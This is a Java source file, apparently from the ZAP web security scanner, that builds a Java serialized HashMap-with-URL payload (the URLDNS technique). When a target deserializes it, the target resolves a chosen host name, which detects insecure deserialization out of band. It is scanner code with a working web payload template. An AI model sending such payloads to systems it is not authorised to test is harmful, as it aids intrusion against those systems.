/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2026 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.ascanrulesAlpha;

import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;
import java.util.regex.Pattern;

/**
 * Builds a Java serialized object that, when deserialized, only makes the target resolve a given
 * host name. It does not contain any gadget chain.
 */
final class JavaSerializedPayload {

    /**
     * A serialized {@code HashMap<URL, String>} with a single key {@code http://HOSTPLACEHOLDER/}
     * whose cached hash code was reset to -1. Deserializing the map rehashes the URL, which
     * resolves its host. It was written with {@code ObjectOutputStream}, using a no-op {@code
     * URLStreamHandler} while building the map so that nothing was resolved at that point.
     */
    private static final byte[] TEMPLATE =
            Base64.getDecoder()
                    .decode(
                            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAD0hPU1RQTEFDRUhPTERFUnQAAS9xAH4ABXQABGh0dHBweHQAAXh4");

    /**
     * The placeholder host, as written in the stream: {@code TC_STRING} (0x74), the length as an
     * unsigned short, then the bytes. The URL's authority and host fields share this one string.
     */
    private static final byte[] PLACEHOLDER = toSerializedString("HOSTPLACEHOLDER");

    private static final int PLACEHOLDER_INDEX = indexOf(TEMPLATE, PLACEHOLDER);

    private static final Pattern HOST_PATTERN = Pattern.compile("[A-Za-z0-9.-]{1,253}");

    private JavaSerializedPayload() {}

    /**
     * Creates the serialized object for the given host.
     *
     * @param host the host name that is resolved when the object is deserialized.
     * @return the serialized object.
     * @throws IllegalArgumentException if the host is {@code null} or not a valid host name.
     */
    static byte[] create(String host) {
        if (host == null || !HOST_PATTERN.matcher(host).matches()) {
            throw new IllegalArgumentException("Invalid host: " + host);
        }
        byte[] replacement = toSerializedString(host);
        byte[] payload = new byte[TEMPLATE.length - PLACEHOLDER.length + replacement.length];
        System.arraycopy(TEMPLATE, 0, payload, 0, PLACEHOLDER_INDEX);
        System.arraycopy(replacement, 0, payload, PLACEHOLDER_INDEX, replacement.length);
        int suffixIndex = PLACEHOLDER_INDEX + PLACEHOLDER.length;
        System.arraycopy(
                TEMPLATE,
                suffixIndex,
                payload,
                PLACEHOLDER_INDEX + replacement.length,
                TEMPLATE.length - suffixIndex);
        return payload;
    }

    /**
     * Encodes the payload in Base64 with the same alphabet and padding as the original value, so
     * that the target decodes it the same way.
     *
     * @param original the original Base64 value.
     * @param payload the payload to encode.
     * @return the encoded payload.
     */
    static String encodeLike(String original, byte[] payload) {
        boolean urlSafe = original.indexOf('-') != -1 || original.indexOf('_') != -1;
        Base64.Encoder encoder = urlSafe ? Base64.getUrlEncoder() : Base64.getEncoder();
        boolean padded = original.endsWith("=") || original.length() % 4 == 0;
        return (padded ? encoder : encoder.withoutPadding()).encodeToString(payload);
    }

    private static byte[] toSerializedString(String value) {
        byte[] bytes = value.getBytes(StandardCharsets.US_ASCII);
        byte[] serialized = new byte[3 + bytes.length];
        serialized[0] = 0x74;
        serialized[1] = (byte) (bytes.length >> 8);
        serialized[2] = (byte) bytes.length;
        System.arraycopy(bytes, 0, serialized, 3, bytes.length);
        return serialized;
    }

    private static int indexOf(byte[] source, byte[] target) {
        for (int i = 0; i <= source.length - target.length; i++) {
            if (Arrays.equals(source, i, i + target.length, target, 0, target.length)) {
                return i;
            }
        }
        throw new IllegalStateException("Placeholder not found in the template.");
    }
}
